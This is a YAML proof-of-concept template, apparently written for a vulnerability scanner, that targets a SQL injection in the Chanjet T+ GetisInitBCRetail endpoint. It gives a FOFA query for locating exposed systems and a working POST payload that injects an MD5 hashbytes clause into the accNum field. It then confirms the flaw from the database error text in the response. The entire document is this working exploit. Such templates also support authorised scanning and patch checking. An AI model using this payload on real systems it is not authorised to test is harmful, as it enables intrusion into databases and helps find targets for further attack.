id: poc-yaml-changjie-t-plus-getisinitbcretail-php-sqli
info:
  name: 畅捷通T+ GetisInitBCRetail SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 畅捷通CRM
  fofa: app="畅捷通-畅捷CRM"
variables:
  t1: random_int(1000,100000)
  t2: md5(t1)
requests:
- method: POST
  path: /tplus/ajaxpro/Ufida.T.SM.UIP.Tool.AccountClearControler,Ufida.T.SM.UIP.ashx?method=GetisInitBCRetail
  headers:
    Content-Type: application/json
  data: '{"accNum":"1'' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes(''MD5'',
    CAST(''{{.t1}}'' AS VARCHAR))))) AND ''rhYc''=''rhYc"}'
  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"DatabaseException")
    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
transport: http
